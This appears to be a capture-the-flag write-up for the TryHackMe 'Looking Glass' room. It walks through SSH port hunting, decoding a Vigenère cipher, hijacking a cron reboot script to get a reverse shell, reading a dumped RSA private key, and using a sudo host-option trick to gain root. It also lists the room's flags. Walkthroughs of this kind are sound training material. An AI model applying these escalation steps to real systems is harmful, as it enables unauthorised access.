# Write Up for Try Hack Me box - [Looking Glass](https://tryhackme.com/room/lookingglass)

Second box fot the ALice in Wonderland challenges.\
The box is a easy way in but full of weird horizontal escalations.\
The Priv Esc is all too sudo.

> Pratyush Prakhar (5#1NC#4N) - 01/06/2021

## RECONNAISSANCE

1. Full Service and Scripts scan on the found ports. --> [nmap file here](rustscan/main.nmap))

2. There are **3 TCP** ports open. 
	1. *Port 22* - SSH - **OpenSSH 7.6p1** 
	2. *Port 9000-14000* - SSH - **Dropbear sshd**

3. Interesting we only find SSH as service. But `Dropbear sounds` interesting. Let's check these ports out.

## SSH - DropBear

1. When we hit one of the dropbear ssh port, we find that two words turn up - `Lower` or `Higher`. This could be guide to us for a port location.

```bash
└─$ ssh root@10.10.234.253 -p 9007
Lower
Connection to 10.10.234.253 closed.
└─$ ssh root@10.10.234.253 -p 12400
Higher
Connection to 10.10.234.253 closed.
```

2. We can make a quick [script](ssh/dropbear/find.py) using binary search to find the correct location if any.

3. We find the right port at - 11130. This might change for you as this is random. Happy hunting.

```bash
..................................
port 11130 found with Lower keyword. Setting range to 11130 to 11130.
Connection to 10.10.234.253 closed.
You've found the real service.
Solve the challenge to get access to the box
Jabberwocky
'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd
Enter Secret:
Incorrect secret.

port found at 11130.
```

4. We find a jumbled text that looks like the famous `Jabberwocky poem`. Let's throw some absic rotational ciphers at it - caeser, rot13, vignere, etc

5. We crack it with the [vignere cipher](https://www.guballa.de/vigenere-solver) and the code is **thealphabetcipher**. We pass the secret and get an important creds at the last line of the [decrypted text](ssh/dropbear/jabber_decrypt.txt). 

5. We can now [use it](creds.txt) against the legit ssh port 22 to get into the system.

## INITIAL ACCESS - SSH - JABBERWOCK

1. We get into the system as `jabberwock`. We can know easily read the user flag.

```bash
└─$ ssh jabberwock@10.10.234.253  
jabberwock@10.10.234.253's password: 
Last login: Tue Feb 13 23:24:33 2024 from 10.13.5.5
jabberwock@looking-glass:~$ pwd
/home/jabberwock
jabberwock@looking-glass:~$ whoami
jabberwock
jabberwock@looking-glass:~$ ls
poem.txt  twasBrillig.sh  user.txt
jabberwock@looking-glass:~$ cat user.txt 
}32a911966cab2d643f5d57d9e0173d56{mht
jabberwock@looking-glass:~$ cat user.txt | rev
thm{******************************}
```

2. We see from our [scan](ssh/tmp/linpeas_www.out) that we can `reboot` the system and when it happens it runs the file - `/home/jabberwock/twasBrillig.sh`. We have full control of the file. Let's edit to get back a reverse listner to us.

```bash
jabberwock@looking-glass:/tmp$ cat /etc/crontab 
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
```

## HORIZONTAL ESC - TWEEDLEDUM

1. We get into the system as `tweedledum` through reverse shell. We can know snoop around more.

```bash
tweedledum@looking-glass:~$ whoami
tweedledum
tweedledum@looking-glass:~$ ls -la
total 40
drwx------ 5 tweedledum tweedledum 4096 Feb 20 23:54 .
drwxr-xr-x 8 root       root       4096 Jul  3  2020 ..
lrwxrwxrwx 1 root       root          9 Jul  3  2020 .bash_history -> /dev/null
-rw-r--r-- 1 tweedledum tweedledum  220 Jun 30  2020 .bash_logout
-rw-r--r-- 1 tweedledum tweedledum 3771 Jun 30  2020 .bashrc
drwxr-x--- 3 tweedledum tweedledum 4096 Feb 20 23:52 .config
drwx------ 2 tweedledum tweedledum 4096 Feb 20 23:54 .gnupg
-rw-r--r-- 1 tweedledum tweedledum  807 Jun 30  2020 .profile
drwxrwxr-x 2 tweedledum tweedledum 4096 Feb 20 23:29 .ssh
-rw-r--r-- 1 root       root        520 Jul  3  2020 humptydumpty.txt
-rw-r--r-- 1 root       root        296 Jul  3  2020 poem.txt
```

2. In the list, we found a set of hashes that we can decrypt and might be a hint for the user `humptydumpty` as the [file](ssh/tweedledum/humptydumpty.txt) says.

```bash
tweedledum@looking-glass:~$ cat humptydumpty.txt 
dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
```

3. Using the common tool [CrackStation](https://crackstation.net/), we get that all of them are recoverable but one. We also get hint to get password for the user.

## HORIZONTAL ESC - HUMPTYDUMPTY

1. We can `su` into user humptydumpty with our new [creds](creds.txt). There is a twist. Find it out.

2. Going thorugh the results of the [linpeas](ssh/tmp/linpeas-humptydumpty.out) and [linux smart enumeration ](ssh/tmp/lse-humptydumpty.out), it is clear that second tool won. JK. But found us a lead. Let's go for alice.

```bash
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... yes!
---
/etc/sudoers.d/alice:alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
3. We bashed our head around and also checked all our results [here](ssh/tmp). We finally foudn that the `alice` user's directory is inaccesbile but can reads the iinner contents.

```bash
humptydumpty@looking-glass:~$ cd /home/
humptydumpty@looking-glass:/home$ cat alice/.config
cat: alice/.config: No such file or directory
humptydumpty@looking-glass:/home$ cat alice/.bash_logout
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
```

3. We also find out that the ssh key for the alice user is indeed stored and created by our user. Lety's get that.

```bash
humptydumpty@looking-glass:/home$ ls -la alice/.bashrc
-rw-r--r-- 1 alice alice 3771 Jul  3  2020 alice/.bashrc
humptydumpty@looking-glass:/home$ ls -la alice/.ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 alice/.ssh/id_rsa
humptydumpty@looking-glass:/home$ cat alice/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpgIBAAKCAQEAxmPncAXisNjbU2xizft4aYPqmfXm1735FPlGf4j9ExZhlmmD
NIRchPaFUqJXQZi5ryQH6YxZP5IIJXENK+a4WoRDyPoyGK/63rXTn/IWWKQka9tQ
2xrdnyxdwbtiKP1L4bq/4vU3OUcA+aYHxqhyq39arpeceHVit+jVPriHiCA73k7g
HCgpkwWczNa5MMGo+1Cg4ifzffv4uhPkxBLLl3f4rBf84RmuKEEy6bYZ+/WOEgHl
fks5ngFniW7x2R3vyq7xyDrwiXEjfW4yYe+kLiGZyyk1ia7HGhNKpIRufPdJdT+r
NGrjYFLjhzeWYBmHx7JkhkEUFIVx6ZV1y+gihQIDAQABAoIBAQDAhIA5kCyMqtQj
X2F+O9J8qjvFzf+GSl7lAIVuC5Ryqlxm5tsg4nUZvlRgfRMpn7hJAjD/bWfKLb7j
/pHmkU1C4WkaJdjpZhSPfGjxpK4UtKx3Uetjw+1eomIVNu6pkivJ0DyXVJiTZ5jF
ql2PZTVpwPtRw+RebKMwjqwo4k77Q30r8Kxr4UfX2hLHtHT8tsjqBUWrb/jlMHQO
zmU73tuPVQSESgeUP2jOlv7q5toEYieoA+7ULpGDwDn8PxQjCF/2QUa2jFalixsK
WfEcmTnIQDyOFWCbmgOvik4Lzk/rDGn9VjcYFxOpuj3XH2l8QDQ+GO+5BBg38+aJ
cUINwh4BAoGBAPdctuVRoAkFpyEofZxQFqPqw3LZyviKena/HyWLxXWHxG6ji7aW
DmtVXjjQOwcjOLuDkT4QQvCJVrGbdBVGOFLoWZzLpYGJchxmlR+RHCb40pZjBgr5
8bjJlQcp6pplBRCF/OsG5ugpCiJsS6uA6CWWXe6WC7r7V94r5wzzJpWBAoGBAM1R
aCg1/2UxIOqxtAfQ+WDxqQQuq3szvrhep22McIUe83dh+hUibaPqR1nYy1sAAhgy
wJohLchlq4E1LhUmTZZquBwviU73fNRbID5pfn4LKL6/yiF/GWd+Zv+t9n9DDWKi
WgT9aG7N+TP/yimYniR2ePu/xKIjWX/uSs3rSLcFAoGBAOxvcFpM5Pz6rD8jZrzs
SFexY9P5nOpn4ppyICFRMhIfDYD7TeXeFDY/yOnhDyrJXcbOARwjivhDLdxhzFkx
X1DPyif292GTsMC4xL0BhLkziIY6bGI9efC4rXvFcvrUqDyc9ZzoYflykL9KaCGr
+zlCOtJ8FQZKjDhOGnDkUPMBAoGBAMrVaXiQH8bwSfyRobE3GaZUFw0yreYAsKGj
oPPwkhhxA0UlXdITOQ1+HQ79xagY0fjl6rBZpska59u1ldj/BhdbRpdRvuxsQr3n
aGs//N64V4BaKG3/CjHcBhUA30vKCicvDI9xaQJOKardP/Ln+xM6lzrdsHwdQAXK
e8wCbMuhAoGBAOKy5OnaHwB8PcFcX68srFLX4W20NN6cFp12cU2QJy2MLGoFYBpa
dLnK/rW4O0JxgqIV69MjDsfRn1gZNhTTAyNnRMH1U7kUfPUB2ZXCmnCGLhAGEbY9
k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
-----END RSA PRIVATE KEY-----
```

## HORIZONTAL ESC - ALICE

1.  We can use the foudn keyt and get in as `alice`. Let's dig some more.

```bash
alice@looking-glass:~$ id
uid=1005(alice) gid=1005(alice) groups=1005(alice)
alice@looking-glass:~$ ls
kitten.txt
alice@looking-glass:~$ cat kitten.txt 
She took her off the table as she spoke, and shook her backwards and forwards with all her might.

The Red Queen made no resistance whatever; only her face grew very small, and her eyes got large and green: and still, as Alice went on shaking her, she kept on growing shorter—and fatter—and softer—and rounder—and—


—and it really was a kitten, after all.
```

2. We remeber the path to escalate. It is through the sudoers voilation. Let's get on as root.

```bash
[!] sud020 Can we sudo with a password?.................................... nope
[!] sud030 Can we list sudo commands with a password?...................... nope
[*] sud040 Can we read sudoers files?...................................... yes!
---
/etc/sudoers.d/alice:alice ssalg-gnikool = (root) NOPASSWD: /bin/bash
```
3. Extra fun down the hole - [Subscribe](ssh/tmp).

## PRIVESC

1. We can basically run bash as root with no password on host `ssalg-gnikool`. Let's try it.

```bash
alice@looking-glass:/tmp$ sudo -l -h ssalg-gnikool
sudo: unable to resolve host ssalg-gnikool
Matching Defaults entries for alice on ssalg-gnikool:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on ssalg-gnikool:
    (root) NOPASSWD: /bin/bash
alice@looking-glass:/tmp$ sudo -h ssalg-gnikool /bin/bash
sudo: unable to resolve host ssalg-gnikool
root@looking-glass:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@looking-glass:/tmp# cd /root/
root@looking-glass:/root# cat 
.bash_history     .local/           .selected_editor  passwords/        root.txt          
.bashrc           .profile          .ssh/             passwords.sh      the_end.txt       
root@looking-glass:/root# cat root.txt 
}f3dae6dec817ad10b750d79f6b7332cb{mht
root@looking-glass:/root# cat root.txt | rev
thm{******************************}
```
2. We get in and read the root flag. Yipee.

3. I leave you with a thought - Is it actually the end? But completed the [series](https://tryhackme.com/hacktivities?tab=practice&page=1&free=all&order=most-popular&difficulty=all&type=all), I will shut off now.

## BROWNIE POINTS

1. User Flag - **thm{65d3710e9d75d5f346d2bac669119a23}**

2. Root Flag - **thm{bc2337b6f97d057b01da718ced6ead3f}**

**Stay Tuned On**\
[GitHub](https://github.com/pratty010/Boxes)\
[LinkedIn](https://www.linkedin.com/in/pratyush-prakhar/)